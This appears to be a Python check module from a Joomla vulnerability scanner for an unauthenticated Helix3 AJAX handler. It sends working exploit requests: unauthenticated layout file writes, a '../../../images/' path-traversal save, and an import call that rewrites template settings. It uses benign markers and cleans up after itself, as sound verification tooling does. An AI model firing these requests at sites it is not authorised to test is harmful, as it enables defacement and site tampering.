from __future__ import annotations

import base64
import json
import re
import time

from ...core.http import form_encode, normalize_url, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from ...core.versions import version_lte

CVE_ID = "CVE-2026-49049"
NAME = "Helix3 unauthenticated AJAX save/remove handler"
COMPONENT = "Helix3 Framework"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Helix3 versions 1.0 through 3.1.0"
FIXED_RULE = "Helix3 3.1.1 or later"
AJAX_ENDPOINT = "/index.php?option=com_ajax&plugin=helix3&format=json"


def affected_helix3(version: str | None) -> bool:
    if version is None:
        return False
    return version_lte(version, "3.1.0")


def response_looks_successful(response: dict, allow_empty: bool = False) -> bool:
    body = response.get("body", "")
    if response.get("status") not in (200, 201, 204):
        return False
    stripped = body.strip()
    if not stripped:
        return allow_empty and response.get("status") in (200, 204)
    if stripped.startswith("<") or re.search(r"<!doctype\s+html|<html\b|<body\b", stripped, re.IGNORECASE):
        return False
    try:
        parsed = json.loads(stripped)
    except json.JSONDecodeError:
        return False
    if isinstance(parsed, dict):
        if parsed.get("success") is True or parsed.get("status") is True:
            return True
        if parsed.get("data") == [] and any(key in parsed for key in ("success", "message", "messages")):
            return parsed.get("success") is True
    return False


def passive_result(plugins: dict | None) -> Finding:
    helix3 = (plugins or {}).get("helix3", {})
    found = bool(helix3.get("found"))
    version = helix3.get("version")
    source = helix3.get("source") or "unknown"

    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Helix3 was not detected via template/plugin manifests or page markers.",
            action="Component not detected via standard public routes; verify manually if Helix3 is installed under a custom template path.",
        )

    if not version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Helix3 was detected at {source}, but its version could not be determined.",
            action=f"Manually verify Helix3 version and update to {FIXED_RULE}.",
        )

    if affected_helix3(version):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"Helix3 {version} is in the affected 1.0 through 3.1.0 range.",
            action=f"Update Helix3 to {FIXED_RULE}. Review template/layout files for unexpected changes.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"Helix3 {version} is outside the affected range.",
        action=f"Keep Helix3 at {FIXED_RULE}.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    ajax_url = f"{base}{AJAX_ENDPOINT}"
    probe_id = rand_str(10)
    layout_name = f"_jvh_cve49049_{probe_id}"
    saved_name = f"{layout_name}.json"
    safe_content = json.dumps({"probe": probe_id, "tool": "ProofCMS"}, separators=(",", ":"))

    save_response = request(
        ajax_url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(
            {
                "data[action]": "save",
                "data[layoutName]": layout_name,
                "data[content]": safe_content,
            }
        ),
        timeout=timeout,
        proxy=proxy,
    )
    save_ok = response_looks_successful(save_response)
    time.sleep(0.3)

    remove_response = request(
        ajax_url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(
            {
                "data[action]": "remove",
                "data[layoutName]": saved_name,
            }
        ),
        timeout=timeout,
        proxy=proxy,
    )
    remove_ok = response_looks_successful(remove_response) if save_ok else False

    if save_ok and remove_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=ajax_url,
            uploaded_filename=saved_name,
            detail=(
                "Safe Helix3 AJAX probe received Helix-style success responses for save and remove, "
                "but no public proof file was observed. Treating this as not confirmed to avoid custom-200 false positives. "
                "The destructive import action was intentionally not tested."
            ),
            action=f"If Helix3 is installed and <= 3.1.0, update to {FIXED_RULE}.",
        )

    if save_ok and not remove_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE_UPLOAD_ONLY",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=ajax_url,
            uploaded_filename=saved_name,
            detail=(
                "Unauthenticated save action appears accessible, but cleanup via remove was not confirmed. "
                f"Save status: {save_response.get('status')}; remove status: {remove_response.get('status')}. "
                "The import action was intentionally not tested."
            ),
            action=f"Manually remove {saved_name} from the Helix3 layouts folder if present, then update to {FIXED_RULE}.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=ajax_url,
        uploaded_filename=saved_name,
        detail=(
            "Safe Helix3 AJAX probe did not confirm unauthenticated save access. "
            f"Save status: {save_response.get('status')}; remove was {'attempted' if save_ok else 'skipped'}."
        ),
        action=f"If Helix3 is 3.1.0 or older, update to {FIXED_RULE} even if the endpoint is blocked by WAF/server rules.",
    )


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    ajax_url = f"{base}{AJAX_ENDPOINT}"
    probe_id = rand_str(10)
    normal_layout = f"_jvh_cve49049_{probe_id}"
    traversal_layout = f"../../../images/_jvh_cve49049_traversal_{probe_id}"
    traversal_saved_name = f"{traversal_layout}.json"
    safe_content = json.dumps(
        {"probe": probe_id, "tool": "ProofCMS", "mode": "aggressive-lab"},
        separators=(",", ":"),
    )

    def post_action(fields: dict) -> dict:
        return request(
            ajax_url,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=form_encode(fields),
            timeout=timeout,
            proxy=proxy,
        )

    normal_save = post_action(
        {
            "data[action]": "save",
            "data[layoutName]": normal_layout,
            "data[content]": safe_content,
        }
    )
    normal_save_ok = response_looks_successful(normal_save)
    normal_remove_ok = False
    if normal_save_ok:
        normal_remove = post_action(
            {
                "data[action]": "remove",
                "data[layoutName]": f"{normal_layout}.json",
            }
        )
        normal_remove_ok = response_looks_successful(normal_remove)

    traversal_save = post_action(
        {
            "data[action]": "save",
            "data[layoutName]": traversal_layout,
            "data[content]": safe_content,
        }
    )
    traversal_save_ok = response_looks_successful(traversal_save)
    traversal_public_url = f"{base}/images/_jvh_cve49049_traversal_{probe_id}.json"
    traversal_public_read = False
    traversal_remove_ok = False
    if traversal_save_ok:
        traversal_public = request(traversal_public_url, timeout=timeout, proxy=proxy)
        traversal_public_read = (
            traversal_public.get("status") == 200
            and probe_id in traversal_public.get("body", "")
        )
        traversal_remove = post_action(
            {
                "data[action]": "remove",
                "data[layoutName]": traversal_saved_name,
            }
        )
        traversal_remove_ok = response_looks_successful(traversal_remove)
        if traversal_public_read:
            traversal_after_remove = request(traversal_public_url, timeout=timeout, proxy=proxy)
            traversal_remove_ok = (
                traversal_remove_ok
                and not (
                    traversal_after_remove.get("status") == 200
                    and probe_id in traversal_after_remove.get("body", "")
                )
            )

    import_response = post_action(
        {
            "data[action]": "import",
            "data[template_id]": "-999999",
            "data[settings]": json.dumps({"jvh_probe": probe_id}, separators=(",", ":")),
        }
    )
    import_accessible = response_looks_successful(import_response, allow_empty=True)

    confirmed = traversal_public_read
    endpoint_indicators = normal_save_ok or traversal_save_ok or import_accessible
    cleanup_ok = (not normal_save_ok or normal_remove_ok) and (not traversal_save_ok or traversal_remove_ok)
    status = "VULNERABLE" if confirmed and cleanup_ok else "VULNERABLE_UPLOAD_ONLY" if confirmed else "NOT_CONFIRMED"
    confidence = "CONFIRMED" if confirmed and cleanup_ok else "HIGH" if confirmed else "MEDIUM"
    cleanup_needed = []
    if normal_save_ok and not normal_remove_ok:
        cleanup_needed.append(f"{normal_layout}.json")
    if traversal_save_ok and not traversal_remove_ok:
        cleanup_needed.append(f"images/_jvh_cve49049_traversal_{probe_id}.json")

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=traversal_public_url if traversal_public_read else ajax_url,
        uploaded_filename=", ".join(cleanup_needed) if cleanup_needed else None,
        detail=(
            "Aggressive lab probe tested Helix3 save/remove, path-traversal save/remove, "
            "and a non-persistent import reachability probe using a negative template_id. "
            f"normal_save={normal_save_ok}, normal_remove={normal_remove_ok}, "
            f"traversal_save={traversal_save_ok}, traversal_remove={traversal_remove_ok}, "
            f"traversal_public_read={traversal_public_read}, "
            f"import_reachable={import_accessible}. "
            + (
                "Public traversal proof was readable with the probe marker. "
                if confirmed
                else (
                    "Endpoint-style indicators were observed, but no public proof was readable; "
                    "this is not enough to confirm because custom-200 routes can mimic success. "
                    if endpoint_indicators
                    else "No Helix-style observable proof was found. "
                )
            )
            + "No arbitrary delete target was used. A 404 after the scan is expected when cleanup succeeded."
        ),
        action=(
            f"Update Helix3 to {FIXED_RULE}. "
            + (
                f"Manual cleanup needed: remove {', '.join(cleanup_needed)}."
                if cleanup_needed
                else "Temporary probe files were removed by the check."
            )
        ),
    )


def run_visual_import_probe(
    target_url: str,
    template_id: int,
    original_settings: dict,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    ajax_url = f"{base}{AJAX_ENDPOINT}"
    probe_id = rand_str(10)
    marker = f"JVH_HELIX3_IMPORT_CONFIRMED_{probe_id}"
    settings = dict(original_settings)
    settings.update(
        {
            "comingsoon_mode": "1",
            "comingsoon_title": "JVH Helix3 visual audit proof",
            "comingsoon_content": marker,
            "copyright": f"ProofCMS local audit marker {probe_id}",
        }
    )

    def post_import(settings_payload: dict) -> dict:
        return request(
            ajax_url,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=form_encode(
                {
                    "data[action]": "import",
                    "data[template_id]": str(template_id),
                    "data[settings]": json.dumps(settings_payload, separators=(",", ":")),
                }
            ),
            timeout=timeout,
            proxy=proxy,
        )

    import_response = None
    proof_response = None
    confirmed = False
    restore_requested = False
    restore_verified = False
    restore_notes = []

    proof_url = f"{base}/?tmpl=comingsoon"

    try:
        import_response = post_import(settings)
        time.sleep(0.4)
        proof_response = request(proof_url, timeout=timeout, proxy=proxy)
        body = proof_response.get("body", "")
        confirmed = proof_response.get("status") == 200 and marker in body
    finally:
        restore_requested = True
        try:
            restore_response = post_import(original_settings)
            restore_http_ok = response_looks_successful(restore_response, allow_empty=True)
            time.sleep(0.4)
            verify_response = request(proof_url, timeout=timeout, proxy=proxy)
            verify_body = verify_response.get("body", "")
            marker_gone = marker not in verify_body
            restore_verified = restore_http_ok and marker_gone
            restore_notes.append(
                f"restore_http_ok={restore_http_ok}, marker_gone={marker_gone}, "
                f"restore_status={restore_response.get('status')}"
            )
        except Exception as exc:  # noqa: BLE001 - cleanup must report any restoration failure
            restore_notes.append(f"restore_error={exc}")
            restore_verified = False

    restore_summary = (
        f"restore_requested={restore_requested}, restore_verified={restore_verified} "
        f"({'; '.join(restore_notes)})"
    )

    if confirmed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=None,
            detail=(
                "Explicit lab visual import proof confirmed that Helix3 import can alter "
                f"template params without authentication. template_id={template_id}; marker={marker}; "
                f"{restore_summary}."
            ),
            action=(
                f"Update Helix3 to {FIXED_RULE}. "
                + (
                    "Original params were verified restored by the check."
                    if restore_verified
                    else "WARNING: Restore could not be verified! Restore original params from backup immediately."
                )
            ),
        )

    import_status = import_response.get("status") if import_response else 0
    proof_status = proof_response.get("status") if proof_response else 0
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=None,
        detail=(
            "Explicit lab visual import proof did not confirm rendered marker. "
            f"Import HTTP status: {import_status}; proof HTTP status: {proof_status}; "
            f"{restore_summary}."
        ),
        action=(
            f"Update Helix3 to {FIXED_RULE}."
            if restore_verified
            else "If params changed and restore_verified=false, restore jos_template_styles.params from backup."
        ),
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode == "aggressive":
        visual_match = re.fullmatch(r"helix3-import:(\d+):([A-Za-z0-9+/=_-]+)", aggressive_command or "")
        if visual_match:
            try:
                encoded = visual_match.group(2).replace("-", "+").replace("_", "/")
                original_settings = json.loads(base64.b64decode(encoded).decode("utf-8"))
            except Exception as exc:  # noqa: BLE001 - malformed remote data must become a finding
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="NOT_CONFIRMED",
                    confidence="LOW",
                    component=COMPONENT,
                    component_version=result.component_version,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    detail=f"Visual import proof was requested, but backup params could not be decoded: {exc}.",
                    action="Use --aggressive-command helix3-import:<template_id>:<base64_params_json>.",
                )
            probe = run_visual_import_probe(
                target_url,
                template_id=int(visual_match.group(1)),
                original_settings=original_settings,
                timeout=timeout,
                proxy=proxy,
            )
        else:
            probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    else:
        probe = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    if result.status == "NOT_AFFECTED" and probe.status not in {"VULNERABLE", "VULNERABLE_UPLOAD_ONLY"}:
        result.detail += " Helix3 AJAX probe was requested but did not confirm vulnerable actions."
        result.exploit_ran = probe.exploit_ran
        result.proof_url = probe.proof_url
        result.uploaded_filename = probe.uploaded_filename
        return result
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": ["helix3"],
        "references": [
            "https://www.joomshaper.com/documentation/helix-framework/helix3",
        ],
    }
